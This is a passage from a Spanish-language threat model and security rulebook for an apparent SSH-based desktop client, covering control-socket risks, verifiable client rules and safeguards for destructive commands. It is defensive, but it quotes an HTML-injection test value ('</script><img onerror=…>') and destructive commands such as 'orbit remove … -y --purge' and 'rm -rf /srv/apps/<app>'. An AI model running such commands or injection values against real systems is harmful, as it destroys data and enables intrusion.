`status --json` 389 ms. Sumarle a cada una un handshake de 150-350 ms convierte una
interfaz aceptable en una lenta. O sea que el multiplexado **hay que tenerlo**.

Pero hay que decir qué se paga por él, porque nadie lo dice:

**Lo que es un socket de control.** Un socket Unix en el sistema de ficheros del usuario.
Cualquier proceso que pueda abrirlo **puede ejecutar comandos en el servidor remoto sin
autenticarse otra vez**: la autenticación ya está hecha, y el socket es el asa. No hace
falta la clave, ni la frase de paso, ni el agente. Es, funcionalmente, una sesión root
abierta y guardada en un fichero.

Eso convierte a `ControlMaster` en un **amplificador de T-01**: un malware que antes tenía
que hablar con el agente o encontrar una clave sin frase de paso, ahora sólo tiene que
encontrar un socket. Y a diferencia del agente —que al menos tiene `ssh-add -t` y, con una
llave en hardware, exige un toque físico—, **el socket de control no confirma nada**.

**La política, con su justificación:**

1. **Permisos `0600` sobre el socket y `0700` sobre su directorio**, y el directorio no es
   `/tmp`. En Linux, `$XDG_RUNTIME_DIR` —que es `/run/user/<uid>`, en modo 0700, en un
   tmpfs y **borrado al cerrar sesión**, que es exactamente lo que se quiere—. En macOS,
   el directorio por confinamiento del usuario (`$TMPDIR`, que ya es privado por usuario)
   o `~/Library/Caches/…` con 0700. **Nunca `/tmp/orbit-…`**, que es legible por todo el
   mundo y donde otro usuario puede plantar cosas.
2. **`ControlPath` con `%C`**, el hash de (host, puerto, usuario, proxy). Dos motivos, y el
   segundo es de seguridad: la ruta **no revela el nombre del servidor** —o sea, no filtra
   A7 a cualquiera que liste el directorio— y nunca supera los 104 bytes de `sun_path` en
   macOS, que es el error clásico de quien usa `%h_%p_%r`.
3. **`ControlPersist=120`, nunca `yes`.** Dos minutos es suficiente para encadenar
   pantallas y corto para no dejar una sesión root abierta mientras el portátil está en la
   mochila. `ControlPersist=yes` deja el máster vivo indefinidamente: es la diferencia
   entre una ventana de dos minutos y una de ocho horas. **El coste de acortarlo es
   medible y pequeño** (un handshake cada dos minutos de inactividad); el coste de
   alargarlo no se ve nunca hasta que se ve.
4. **Al bloquearse la aplicación (§4.4) se cierran los másters**, con `ssh -O exit` por
   cada servidor. Es la decisión que hace que el bloqueo signifique algo de verdad: sin
   ella, bloquear la ventana deja las sesiones root abiertas debajo, y el bloqueo es
   decorativo. **Con una excepción explícita: si hay un despliegue en curso, ese máster no
   se cierra**, porque cerrarlo mataría el despliegue. Se cierra al terminar.
5. **Al cerrar la aplicación se cierran todos**, sin excepción.
6. **El socket huérfano se limpia, no se reutiliza a ciegas.** Tras una suspensión o un
   cambio de red, el máster puede estar muerto y el socket seguir ahí. La política del
   informe de código §3.7 es la correcta: ante un `TransportError` en la primera llamada
   tras un periodo de inactividad, `ssh -O exit` y **un** reintento sin retroceso. Lo que
   hay que añadir es la comprobación de que ese `-O exit` no se convierta en un bucle:
   máximo un intento por minuto y por servidor.
7. **En un equipo compartido —un servidor de salto, una máquina de laboratorio, un
   contenedor de desarrollo con varios usuarios— el multiplexado se desactiva.** No porque
   otro usuario pueda leer el socket (0600 lo impide), sino porque **root en esa máquina sí
   puede**, y en una máquina compartida root no es sólo el usuario. Es una casilla en la
   configuración del servidor, y el texto dice por qué.
8. **`ControlMaster` no existe en Windows.** OpenSSH para Windows no lo implementa —los
   sockets Unix del multiplexado no están portados—. Consecuencia doble: en Windows se paga
   el handshake en cada llamada (y por eso la caché de la interfaz importa más ahí), y
   **esta superficie no existe en Windows**. Es la única vez en todo el documento en que
   Windows sale ganando en seguridad, y conviene anotarlo para no proponer «emularlo» con
   una sesión `ssh -tt` persistente: eso sería la misma superficie hecha a mano y además
   rompería la separación de canales de la que depende todo el contrato.

**Criterios de aceptación:** B-55 a B-57, §6.1.

**Lo que se descarta:** `ControlPersist=yes` con cierre manual. Es la configuración que
todo el mundo copia de un blog, y deja sesiones root abiertas durante días en portátiles
que viajan.

---

#### T-11 · Nombres y datos que engañan al ojo
**Actor:** C3, C6. **Severidad: Media.**

Ya apuntado en T-02: bidi overrides, homoglifos (`оrbit` con о cirílica), nombres muy
largos que empujan el resto de la fila fuera de la vista, espacios de ancho cero.
Sirve para que el usuario confirme una acción sobre una app creyendo que es otra —lo
que convierte esto en el habilitador de §3, los comandos peligrosos—.

Mitigación: normalización NFC, marca visible de los caracteres no imprimibles y de
los bidi, truncado con elipsis **al final y con el texto completo disponible**, y la
regla de forma de T-03 que ya deja fuera a la mayoría (`_app_name_ok` no admite ni
mayúsculas ni no-ASCII). Lo que no encaja en la regla se enseña marcado y no se opera.

---

#### T-11b · Un equipo compartiendo servidores, sin ningún plano de control
**Actor:** C6. **Activos:** A2, A3, y la capacidad de reconstruir qué pasó.
**Severidad: Alta**, y sin mitigación técnica completa. Es el hueco estructural del
producto y hay que escribirlo antes de que alguien lo descubra vendiéndolo.

**El escenario, que es el normal en una agencia.** Cuatro personas, doce servidores. Cada
una tiene su clave en `~/.ssh/authorized_keys` del servidor, o todas comparten la del
usuario `root`. Cada una instala Orbit Desktop en su portátil. Y a partir de ahí:

- **Todas tienen exactamente los mismos permisos**, que son todos. No hay «sólo lectura»,
  no hay «puede desplegar pero no borrar», no hay «producción necesita dos personas».
- **Nadie sabe qué hizo quién.** `logline` (línea 473) escribe en el log del servidor con
  marca de tiempo y comando, pero **no con el usuario**: `logline "remove tienda purge=yes"`
  no dice quién lo pidió. Y si todos entran como `root`, el `auth.log` de SSH tampoco lo
  distingue más allá de la huella de la clave.
- **Dos personas pueden operar sobre la misma app a la vez** sin enterarse. Ver P-46.

**Por qué no hay control de acceso por rol, y por qué eso es correcto.** Un rol necesita
un sitio donde vivir y alguien que lo haga cumplir. Los dos sitios posibles son el cliente
y el servidor, y los dos están cerrados:

- **En el cliente no sirve de nada.** Un permiso comprobado en el portátil de quien lo
  tiene que respetar es una sugerencia: quien quiera saltárselo abre un terminal y escribe
  `ssh servidor orbit remove tienda -y --purge`. Implementarlo sería vender una seguridad
  que no existe, que es peor que no tenerla, porque cambia el comportamiento de la gente.
- **En el servidor rompería el principio 2** —«el servidor no gana ni un proceso, ni un
  puerto, ni un byte de estado»— y además tampoco funcionaría: la idea del grupo
  `orbit-admin` con sudoers limitado a `/usr/local/bin/orbit`, que el BRIEF recoge, **sigue
  siendo equivalente a root porque `orbit exec` existe**. No hay forma de dar «medio Orbit».

O sea que la respuesta honesta es: **Orbit Desktop no tiene ni puede tener control de
acceso por rol, y el modelo de permisos del equipo es el de `authorized_keys`.** Eso se
escribe en el `SECURITY.md` del cliente, en la sección de límites conocidos.

**Lo que sí se puede hacer, que no es control de acceso pero reduce mucho el daño real:**

1. **Atribución voluntaria en el log del servidor.** El cliente puede anteponer a cada
   orden destructiva un `orbit`… no, no puede: escribir en el log del servidor requeriría
   un comando que no existe. Lo que **sí** puede es identificarse por el canal que ya
   existe: **entrar con un usuario por persona en vez de todos como `root`**, y
   recomendarlo activamente en el alta del servidor. Con `dave@vps` y `ana@vps`, el
   `auth.log` y `sudo` ya atribuyen, sin código nuevo y sin tocar el servidor. Es la
   mitigación más barata y la que nadie aplica porque nadie la sugiere en el momento
   adecuado, que es cuando se añade el servidor.
2. **Registro local por persona** (T-01, D-04). No es auditoría —cada uno guarda el suyo y
   puede borrarlo— pero contesta «¿fui yo?», que es la mitad de las preguntas de un
   incidente de equipo.
3. **La marca de producción es del servidor, no de la persona.** Si el servidor está
   marcado como producción, la fricción de §3 se aplica a todo el mundo por igual. Es lo
   único que se puede hacer cumplir de verdad, porque no depende de quién eres sino de
   dónde estás.
4. **Detección de operación concurrente** (P-46): antes de una acción destructiva, el
   cliente relee el estado y comprueba que no ha cambiado desde que se pintó la pantalla.
   No impide que dos personas borren a la vez; impide que la segunda lo haga sobre una
   pantalla que ya era mentira.
5. **Y una social, que es la que más funciona:** el diálogo de `--purge` sobre un servidor
   de producción dice, además del inventario, **cuándo fue el último despliegue y quién lo
   hizo si se puede saber** (`state.last_deploy`, `last_deploy_sha`). «Esta app se desplegó
   hace 40 minutos» es la frase que hace que alguien se pare a preguntar en el chat.

**Lo que se descarta:** un servicio de coordinación propio —una base de datos compartida
de bloqueos, un plano de control de equipo— que es exactamente el producto que el
principio 5 dice que no hace falta. *«Un cliente que habla SSH con varios servidores ES el
`orbit remote add` de la v2.0, sin plano de control.»* Meter un plano de control por la
puerta de atrás para resolver los permisos sería empezar el segundo producto dentro del
primero contra el que avisa §1 de `ARCHITECTURE.md`.

---

#### T-12 · Persistencia local de datos que no deberían persistir
**Actores:** C1, y el backup del portátil. **Severidad: Media-Alta.**

Toda aplicación de escritorio moderna guarda estado sin que nadie lo decida: caché de
red, estado de la interfaz serializado, base de datos local del framework,
`localStorage` de la vista web, ficheros temporales, el volcado de memoria al
cerrarse mal. Cualquiera de esos puede acabar con la salida de `orbit env get` dentro.

Mitigación: **una lista explícita de lo que se persiste**, y una prueba que la
comprueba (sección 5.5). Todo lo demás es efímero por defecto. Y una prueba de
regresión concreta: ejecutar un flujo completo con secretos conocidos y **buscar esos
secretos en todo lo que la aplicación haya escrito en disco**, con `grep -r`. Es el
mismo instrumento que ARCHITECTURE §11.1 usó para auditar las pruebas —*«no las leas;
móntales un sistema falso encima y mira qué queda tocado»*— aplicado al disco.

---

### 1.6 Resumen

| ID | Amenaza | Actor | Activo | Sev. | Mitigación principal |
|---|---|---|---|---|---|
| T-01 | Malware lee la config del cliente | C1, C2 | A1, A7 | Crítica | No guardar nada guardable; llavero; permisos `0700/0600` |
| T-02 | Servidor comprometido inyecta por el contrato | C3 | Todos | Crítica | Nunca marcado; validar forma; presupuesto de tamaño/tiempo |
| T-03 | Inyección de comandos en la orden SSH | Todos | Todos | Crítica | Un solo constructor, argv escapado con comillas simples, tipos, dos modos. **Implementado y medido: 28.464 viajes en 4 shells, un fallo cazado** |
| T-04 | Suplantación del host SSH | C4 | A1 | Alta | `accept-new`, `known_hosts` del sistema, cambio = error |
| T-05 | Cadena de suministro y actualizador | C5 | A9 → todos | Crítica | Lockfiles, auditoría en CI, firma con clave empotrada |
| T-06 | Filtración por la interfaz | C7, C1 | A3-A5, A8 | Alta | `.env` nunca entero; telemetría sin nombres; informes revisables |
| T-07 | Servidor equivocado | usuario | A2 | Alta | Servidor siempre visible; `servidor:app` en todo |
| T-08 | Claves sin frase de paso / agente | C1, C2 | A1 | Alta | Detectar y avisar una vez; nunca pedir la frase |
| T-09 | Respuesta lenta o parcial | C3, red | — | Media | No inventar valores; distinguir seis finales |
| T-10 | Corte a mitad de despliegue | red | — | Media | No afirmar el resultado; no reintentar solo |
| T-11 | Nombres que engañan | C3, C6 | — | Media | NFC, marcado, regla de forma |
| T-12 | Persistencia accidental | C1 | A3 | Media-Alta | Lista blanca de lo que se guarda + prueba con `grep` |

### 1.7 Lo que está fuera del modelo, dicho a propósito

La sección «Qué NO protege» de `SECURITY.md` de Orbit es la parte más útil de ese
documento. Aquí va la equivalente:

- **Un equipo con el atacante dentro y el usuario delante.** Si C2 tiene ejecución de
  código y el agente está desbloqueado, ha ganado. Lo que hacemos es no darle nada
  extra y dejar rastro.
- **Un servidor ya comprometido con root.** Orbit Desktop no puede detectarlo, no lo
  intenta y no debe fingir que lo hace. Lo que hace es que ese servidor no contamine
  a los demás **a través del cliente**.
- **El código que despliegas.** Igual que Orbit: no lo auditamos. Si tu repo trae una
  dependencia maliciosa, se ejecuta en el servidor.
- **Los secretos en reposo en el servidor.** Siguen en texto plano en `shared/.env`
  con `0640`. Orbit Desktop no es una bóveda y no la sustituye.
- **Un compañero de equipo con acceso legítimo.** No hay control de acceso por rol y **no
  lo puede haber**: en el cliente sería una sugerencia —quien quiera se lo salta abriendo
  un terminal— y en el servidor rompería el principio 2, y tampoco funcionaría, porque
  `orbit exec` existe. Quien tiene la clave, puede. Desarrollado en T-11b, con las cinco
  cosas que sí se pueden hacer.
- **El compromiso dirigido de nuestro propio entorno de desarrollo.** Un equipo pequeño no
  lo detecta. Lo que hace es que la clave de firma no esté ahí (§7.3) y que la rotación
  esté escrita, para que el daño se mida en horas y no en meses.
- **Que un secreto copiado al portapapeles no lo lea nadie.** En X11 es imposible; en
  macOS y Windows depende de que el gestor de portapapeles respete una convención. Se
  promete el borrado por temporizador y nada más (T-06, canal 2).
- **Protección contra la persona que mira la pantalla si el usuario decide enseñarla.**
  El modo presentación ayuda; no obliga.

---

## 2. Reglas duras del cliente

Escritas como invariantes, con **cómo se comprueba cada una**. Una regla de seguridad
que no se puede comprobar es una intención, y las intenciones se erosionan en el
commit 400. Cada una lleva su forma de verificación: un test, una regla de lint, o un
`grep` en CI. Las que sólo se pueden verificar leyendo están marcadas como tales, y
son las que hay que revisar en cada auditoría.

### 2.1 Construcción de órdenes

**SEC-01 · Ningún comando remoto se construye por concatenación de cadenas.**
Toda orden se expresa como una lista de argumentos y se serializa en un único punto.
*Verificación:* test de arquitectura — sólo los ficheros de `transport/` pueden
mencionar el binario `ssh`; el resto del árbol falla en CI si lo hacen. Más un
`grep` que prohíbe la interpolación de variables dentro de un literal que contenga
`orbit `.

**SEC-02 · Toda variable que entra en un comando remoto pasa por el escapador.**
Elemento a elemento, dentro del constructor, con el algoritmo de §T-03 capa 2 —comillas
simples y conjunto seguro estrecho—, **no con `printf %q`**, que produce escapes que sólo
entiende bash. *Verificación:* prueba de propiedad — para cualquier lista de cadenas,
`argv → escapar → shell remoto → argv` es la identidad. **Ya ejecutada**: §5.1 A, cuatro
shells, 28.464 viajes.

**SEC-03 · Nunca se invoca `orbit` por `PATH`.** Ruta absoluta, configurable por
servidor, por defecto `/usr/local/bin/orbit`. Motivo: un `PATH` manipulado en el
`.bashrc` del usuario remoto —o por un atacante que sólo tenga escritura en el
`$HOME`— redirige todos los comandos a otro binario. *Verificación:* test unitario
sobre el `argv` generado.

**SEC-04 · Dos transportes con nombres distintos:** `remote_command(server, argv)`
para todo, `remote_shell(server, script)` sólo para `orbit exec`. El segundo se
invoca desde exactamente un fichero. *Verificación:* test de arquitectura.

**SEC-05 · Todo campo con forma conocida se valida antes de salir**, con las reglas
copiadas del servidor: `_app_name_ok` (línea 1175), `_env_key_ok` (línea 10957),
formato de release, dominio, `--ref`. La validación **no sustituye** al escapado.
*Verificación:* tests unitarios con el corpus de la sección 5.1, y un test que
comprueba que si se desactiva el escapado los casos siguen sin ejecutar nada —o sea,
que las dos capas son independientes—.

**SEC-06 · Ningún dato que llegue del servidor se usa como argumento sin pasar por
SEC-05.** Un nombre de app que viene de `orbit list --json` es entrada no confiable.
*Verificación:* el tipo del modelo de datos del contrato es distinto del tipo que
acepta el constructor de comandos, y sólo se convierte pasando la validación. Lo
fuerza el compilador o el sistema de tipos; no una revisión.

**SEC-26 · Toda orden que el cliente construya lleva el nombre de la app explícito,
siempre.** No es una recomendación: el tipo del constructor no puede representar la llamada
sin app. Motivo verificado (P-50): sin TTY, `orbit info`, `restart`, `stop` y compañía **no
abortan — eligen la primera app por orden alfabético y salen con 0**. Sólo `info --json`,
`deploy --json` y `rollback` se protegen. *Verificación:* el tipo lo impide; más un test que
intenta construir la llamada sin app y comprueba que no compila o que lanza.

**SEC-27 · La lista de capacidades del servidor se descubre ejecutando, no leyendo la
documentación.** Cada capacidad que el cliente asume tiene una prueba que la ejerce contra
el `orbit` real. Motivo verificado (P-49): `doctor --fix --json --yes` está documentado en
dos ficheros y no existe en el binario. *Verificación:* §5.4b nivel 1, en el arranque de CI.

### 2.1b El canal multiplexado

**SEC-28 · El socket de `ControlMaster` vive en un directorio `0700` propio del usuario y
tiene modo `0600`.** En Linux, `$XDG_RUNTIME_DIR` (`/run/user/<uid>`, tmpfs, borrado al
cerrar sesión). **Nunca `/tmp`.** *Verificación:* §5.1 H, comprobando el modo del fichero,
no la ruta escrita en el código.

**SEC-29 · `ControlPath` usa `%C`**, que no revela el nombre del servidor en el sistema de
ficheros —o sea, no filtra A7 a quien liste el directorio— y no desborda los 104 bytes de
`sun_path` en macOS. *Verificación:* test del `argv` generado, más una prueba con un
hostname de 80 caracteres.

**SEC-30 · `ControlPersist` es finito (120 s), nunca `yes`; los másters se cierran al
bloquear la aplicación y al cerrarla.** Excepción única y explícita: un máster con un
despliegue en curso no se cierra al bloquear, y se cierra al terminar. Un socket de control
es una sesión root abierta guardada en un fichero: la vida del socket **es** la ventana de
exposición. *Verificación:* §5.1 H, las dos mitades.

**SEC-31 · El multiplexado se puede desactivar por servidor**, y la interfaz lo recomienda
en máquinas compartidas, donde root no es sólo el usuario. *Verificación:* la opción existe
y el `argv` generado la respeta.

### 2.2 Credenciales

**SEC-07 · El cliente no guarda contraseñas, ni frases de paso de claves SSH, ni
tokens, ni claves privadas. En ningún soporte, ni cifrado.** Lo que necesite una
credencial, la obtiene del `ssh-agent` o del `ssh` del sistema.
*Verificación:* prueba de la sección 5.5 (flujo completo con secretos marcados,
`grep -r` sobre todo lo escrito en disco), más revisión de que no existe ningún campo
de formulario llamado «contraseña» o «frase de paso» fuera de los que la delegan.

**SEC-08 · El cliente no implementa autenticación SSH.** Delega en el `ssh` del
sistema y en `~/.ssh/config`, incluido `ProxyJump`. *Verificación:* lectura + prueba
de integración con un `ProxyJump` real (sección 5.4).

**SEC-09 · `StrictHostKeyChecking=accept-new`, y el almacén es
`~/.ssh/known_hosts`.** Nunca `no`. Un cambio de clave de host conocido aborta y no
tiene botón de continuar en la interfaz. *Verificación:* test de integración con un
`sshd` de pruebas al que se le cambia la clave de host entre dos conexiones.

**SEC-10 · `ForwardAgent` está desactivado y no hay interruptor global para
activarlo.** *Verificación:* revisión del `argv` generado; test que comprueba que
`-o ForwardAgent=no` está presente o que la opción nunca se emite como `yes`.

**SEC-11 · El valor de un secreto obtenido con `env get` vive sólo en memoria,
durante la vida de la pantalla que lo pidió.** No se cachea, no se serializa, no
entra en el estado persistido. *Verificación:* sección 5.5.

### 2.3 Salida y presentación

**SEC-12 · El `.env` nunca se pinta entero.** La pantalla muestra nombres; cada valor
se revela de uno en uno con un `orbit env get` explícito, y se vuelve a ocultar solo.
No existe «revelar todo». *Verificación:* test de interfaz.

**SEC-13 · Los secretos revelados se ocultan al perder el foco la ventana, al cambiar
de pantalla y a los 30 segundos.** *Verificación:* test de interfaz.

**SEC-14 · Ningún dato del contrato se inserta como marcado.** Prohibido `innerHTML`,
`dangerouslySetInnerHTML`, `v-html`, `document.write` y la construcción de HTML por
concatenación con datos del servidor. *Verificación:* regla de lint que falla el
build, más un caso de prueba con un nombre de app que contenga `</script><img
onerror=…>`, que debe verse **literalmente en pantalla**.

**SEC-15 · La telemetría no contiene ninguna cadena procedente del servidor ni del
usuario.** Ni dominios, ni nombres de app, ni hostnames, ni IPs, ni rutas.
Apagada por defecto. *Verificación:* lista blanca de campos declarada en código, y un
test que serializa un evento con un estado lleno de datos sensibles y comprueba que
ninguno aparece.

**SEC-16 · Los informes de fallo se enseñan completos al usuario antes de enviarse, y
no se envían solos.** *Verificación:* test de interfaz.

**SEC-17 · El log local registra el comando y el objetivo, no los argumentos
sensibles.** Se hereda de `logline "exec $name"` (línea 9024). *Verificación:*
inspección del log tras el flujo de la sección 5.5.

**SEC-18 · Un dato que no se ha podido obtener se pinta como desconocido, no como un
valor.** `null` no es 0. `unreachable` no es `unchanged`. Un servidor sin contacto no
enseña datos viejos sin decir que son viejos. *Verificación:* sección 5.2, catálogo
de respuestas patológicas.

### 2.4 Contrato y confianza

**SEC-19 · El cliente comprueba `schema` y `contract` antes de interpretar nada.**
`schema` distinto del esperado: se rechaza la respuesta y se explica. `contract`
mayor del conocido: se avisa y se degrada a lo que se entienda, sin inventar.
*Verificación:* sección 5.2.

**SEC-20 · Un campo desconocido se ignora sin ruido; un campo esperado que falte o
venga con otro tipo es un error de la respuesta, no un valor por defecto.** La
promesa del contrato es que los campos se añaden, nunca se renombran (§13.1). El
cliente cumple su mitad. *Verificación:* sección 5.2 y 5b.

**SEC-21 · Presupuesto duro de tamaño y de tiempo por respuesta.** 8 MB y un tiempo
máximo por comando, con `deploy` en su propia categoría. Superarlo aborta y lo dice.
*Verificación:* servidor falso que emite un flujo infinito.

**SEC-22 · Todo lo que llega por stdout se parsea como **un solo** objeto JSON, y lo
que llega por stderr no se parsea nunca como datos.** §13.6b es explícito: por stdout
un único objeto, y con `--json` todo lo dirigido a una persona sale por stderr. La
excepción es `--progress`, que emite NDJSON **por stderr** y se consume como flujo de
sucesos, nunca como resultado. *Verificación:* sección 5.2.

**SEC-23 · Basura antes o después del JSON en stdout es un fallo, no algo que
recortar.** No se busca la primera `{`. Motivo: buscar la primera llave es
exactamente cómo un servidor comprometido cuela un objeto suyo delante del legítimo.
*Verificación:* sección 5.2.

### 2.5 El servidor no cambia

**SEC-24 · El cliente no escribe en `/etc/nginx`, `/etc/orbit` ni systemd. Sólo
invoca `orbit`.** *Verificación:* revisión del catálogo de comandos posibles — la
lista de `argv` que el cliente puede generar es finita y está en un solo fichero; se
audita leyendo ese fichero. Y prueba e2e: tras un uso completo, `orbit doctor` en el
servidor sale igual que antes.

**SEC-25 · El cliente no instala nada en el servidor, ni deja ficheros, ni procesos.**
*Verificación:* prueba e2e con inventario antes y después.

---

## 3. Los tres comandos peligrosos

Antes de los tres, un hallazgo que cambia el diseño de los tres, y que sale de leer
`cmd_remove` (líneas 11302-11375):

**Cuando el cliente invoca estos comandos, las confirmaciones del servidor no
existen.** `cmd_remove` pide escribir el nombre de la app a mano (líneas 11324-11327)
**sólo si no viene `-y`**, y el segundo `confirm` del borrado de datos (línea 11347)
se cortocircuita si viene `--purge`. Como el cliente no tiene un terminal al otro
lado, tiene que pasar `-y`. Resultado: **`orbit remove <app> -y --purge` borra la app,
su vhost, su unidad, su usuario de sistema y `/srv/apps/<app>` entero sin una sola
pregunta.**

Eso no es un fallo de Orbit —`-y` significa «acepta el valor por defecto», y el valor
por defecto del borrado de datos es «no», por eso hace falta `--purge` aparte— pero sí
significa que **toda la protección se traslada al cliente**. La frase que hay que
tener escrita en el código, junto a la función que lo invoca:

> Aquí no hay red debajo. Si esta pantalla se equivoca, no hay una segunda pregunta
> en el servidor que la pare.

**Y hay una segunda mitad de ese hallazgo, verificada en la ronda 2 y peor de leer.** No es
sólo que no haya confirmación: es que **el servidor tampoco comprueba que le hayas dicho
sobre qué app operar**. Sin TTY, `orbit info`, `restart`, `stop` y compañía no abortan —
imprimen el menú, **eligen la primera app por orden alfabético y salen con código 0**
(`EVIDENCIA.md` E5). Sólo `info --json`, `deploy --json` y `rollback` se protegen. Un
`argv` al que se le olvide el nombre de la app no falla: acierta en otra cosa. Por eso
SEC-26 no es una comprobación en tiempo de ejecución sino una restricción del tipo: **el
constructor de órdenes no puede representar la llamada sin app.**

### 3.1 `orbit remove --purge`

**Qué hace, exactamente.** Dos daños de categoría distinta, y Orbit los separó a
propósito (§13.5 y el comentario de las líneas 11298-11301):

- **Reversible**: quitar el vhost (11341), parar y borrar la unidad (11331-11336),
  quitar el pool de php-fpm (11338-11340), borrar `/etc/orbit/apps/<app>.conf`
  (11353). Todo eso se rehace con `orbit new` en un minuto.
- **Irreversible**: `rm -rf /srv/apps/<app>` (línea 11348), que se lleva el `.env`,
  todas las releases y **las subidas de los usuarios finales** (§18.7: lo que sube un
  visitante vive en `shared/` precisamente para sobrevivir a los despliegues). Y con
  `--purge`, `userdel` del usuario de sistema (11362-11364).

**Diseño de la interacción.**

1. **Son dos operaciones distintas en la interfaz, no una casilla.** «Retirar del
   servidor» y «Retirar y borrar los datos» son dos entradas separadas, con textos
   distintos y con el segundo en un submenú, no al lado del primero. Motivo: una
   casilla junto a un botón se marca sin leerla. Es la traducción a interfaz de la
   decisión que Orbit ya tomó al separar `--purge` de `-y`.
2. **Antes de ejecutar, se enseña el inventario de lo que se va a perder, obtenido en
   ese momento** con `orbit info <app> --json`: el número de releases, la fecha del
   último despliegue, cuántas claves tiene el `.env` (nombres, nunca valores) y —si se
   puede saber sin coste— el tamaño de `shared/`. Un «esto borrará 4,2 GB, 5 releases
   y 12 variables de entorno» para una acción concreta. No un texto genérico.
3. **Se nombra el servidor.** `producción-1 : tienda`, en el título del diálogo, con
   el color del servidor. T-07.
4. **Se escribe el nombre de la app a mano.** Sí, siempre, para `--purge`. No es una
   fricción arbitraria: **Orbit ya lo hace** en su rama interactiva (línea 11325,
   *«Escribe el nombre para confirmar»*), y el cliente no puede ser más permisivo que
   el terminal al que sustituye. Se compara literalmente, sin recortar espacios ni
   normalizar mayúsculas, porque el nombre está en minúsculas por `_app_name_ok`.
   Para la retirada **sin** `--purge` basta con un botón de confirmación, porque es
   reversible: pedir el nombre para las dos hace que escribir el nombre deje de
   significar nada.
5. **El botón de confirmar no es el botón por defecto**, no tiene el foco al abrir el
   diálogo, y está desactivado hasta que el nombre coincide.
6. **Nunca hay un «recordar mi elección» ni un modo que salte esto.**
7. **Después: se ofrece deshacer lo que se puede deshacer y se dice lo que no.** «La
   app se ha retirado. Los ficheros ya no están y no se pueden recuperar. Si hay una
   copia en `/var/backups/orbit`, se puede restaurar con `orbit restore`.» Esa
   comprobación se puede hacer de verdad antes de borrar —Orbit tiene `backup` y
   `restore`— y merece la pena: **ofrecer una copia antes de un `--purge` es la única
   mitigación real que existe para un borrado irreversible.**
8. **Se registra en el log local**: qué, en qué servidor, cuándo. T-01.

**Lo que se descarta:** una papelera propia en el cliente que mueva `/srv/apps/<app>`
a otro sitio en vez de borrarlo. Rompe el principio 1 —sería el cliente actuando
sobre el servidor por su cuenta— y crea dos verdades sobre qué está borrado. Si algún
día hace falta una papelera, va en `orbit`, no aquí.

### 3.2 `orbit rollback`

**Qué hace** (líneas 6698-6723): mueve el symlink `current`, reinicia la unidad si la
hay y regenera el vhost. **No borra nada** y es reversible: se vuelve a la release
anterior con otro `rollback`.

Pero tiene tres cosas que lo hacen peligroso de una forma distinta:

- **Es instantáneo y afecta a producción de golpe.** Entre pulsar y servir otra
  versión pasan segundos.
- **El código vuelve atrás; los datos no.** Si el despliegue que se revierte trajo
  una migración de base de datos, volver el código a antes de la migración deja la
  app apuntando a un esquema que no entiende. Orbit lo sabe y por eso §7.3 decide
  *«avisar sí, aplicar nunca»* con las migraciones. **El cliente tiene que decirlo en
  el diálogo**, y es el dato más valioso que puede dar ahí.
- **El autodespliegue lo deshace.** Si `A_AUTODEPLOY` está activo, el siguiente ciclo
  del temporizador vuelve a la punta de la rama. Orbit ya avisa de esto en el camino
  de `--ref` (líneas 5297-5299). En el rollback el efecto es el mismo y **es el error
  que más veces se comete**: se revierte a las 3 de la mañana y a las 3:05 el
  temporizador vuelve a poner la versión rota.

**Diseño de la interacción.**

1. **No se escribe el nombre a mano.** Es reversible y la fricción no se paga: pedir
   el nombre para un rollback enseña a la gente a teclear nombres sin leer, y entonces
   lo teclean también en el `--purge`. **La fricción es un recurso escaso; se gasta
   donde el daño es irreversible.**
2. **Se elige la release de una lista**, nunca se escribe. Vienen de
   `info --json → releases`, ordenadas de la más nueva a la más vieja, con la activa
   marcada y **desactivada**: Orbit ya devuelve un aviso amable si eliges la actual
   (línea 6712), pero un cliente no debe ni ofrecerla. §13.5 explica por qué no vale
   coger la primera por defecto: *«la primera es la que ya está activa»*.
3. **Antes de ejecutar se enseña, para la release destino:** su fecha legible, el
   commit al que corresponde si se conoce (`state.last_deploy_sha` da el de la
   actual), y **cuántos despliegues se retroceden**. «Vas a volver 3 despliegues
   atrás, al de hace 6 días» es información; «vas a volver a 20260805-041230» no.
4. **El aviso de migraciones va siempre**, no sólo cuando se detecta una. El cliente
   no puede saber si hubo migración; lo que puede es no dejar que se olvide.
5. **El aviso de autodespliegue va cuando `state.autodeploy` es `true`**, y con la
   acción al lado: «desactivar el autodespliegue de esta app antes de revertir». Que
   el diálogo ofrezca hacer las dos cosas es la diferencia entre un aviso útil y un
   párrafo.
6. **Después, la vuelta atrás está a un clic**, con la release que estaba activa antes
   ya seleccionada. Un rollback que no se puede deshacer fácilmente asusta, y el
   miedo hace que la gente no revierta cuando debe.

**Lo irreversible aquí no es el rollback: son sus efectos secundarios.** El reinicio
del servicio corta las conexiones en vuelo, y §5.2 documenta que hasta un arreglo
concreto el «reinicio sin corte» daba 1-2 respuestas 502 por despliegue. Eso se dice.

### 3.3 `orbit exec`

El más peligroso de los tres y el que menos se parece a los otros dos, porque **el
daño no está acotado**. `orbit remove --purge` hace una cosa mala conocida;
`orbit exec` hace lo que le digas, con el entorno de la app, como el usuario de la
app, en un servidor de producción.

**Lo que hay que saber del comportamiento real** (líneas 8991-9027 y 8963-8987):

- Reproduce el entorno de la unidad de systemd: mismo directorio, mismo `.env`, mismo
  `PATH`, `NODE_ENV=production`. El comentario del código lo justifica: *«si no
  coincidiera, sería una herramienta de depuración que miente»*.
- Corre como el usuario de la app (`app_user`, línea 869), no como root. Con el
  aislamiento (§5.3) eso acota el daño a esa app; sin él, es `deploy`.
- **La regla del argumento único**: si `$#` es 1 y el argumento contiene
  `[[:space:]|&;<>()$\`` `]`, se ejecuta como `bash -lc "$1"`; en cualquier otro caso
  se ejecuta el `argv` tal cual. Es decir que `exec web "ls -la"` y `exec web ls -la`
  **no son lo mismo**: el primero pasa por un shell, el segundo no.
- El `.env` se carga con `set -a` (línea 8965), así que **cualquier cosa que se
  ejecute ahí ve todos los secretos de la app en el entorno**.
- Orbit ya avisa de `NODE_ENV=production` si el comando contiene `install`
  (líneas 9017-9021), por stderr.
- El log guarda sólo el nombre de la app (línea 9024).

**Diseño de la interacción.**

1. **Es una pantalla, no un campo.** Vive en su propio sitio, con un encabezado que
   dice qué es: «Ejecuta un comando dentro de `<app>` en `<servidor>`, como el usuario
   `<usuario>`, con el `.env` cargado». Los cuatro datos, siempre visibles. Nada de
   una cajita en la esquina de la pantalla de la app.
2. **Se enseña el comando exacto que se va a ejecutar, ya escapado, antes de
   ejecutarlo.** No una aproximación: la cadena literal. Es lo que convierte
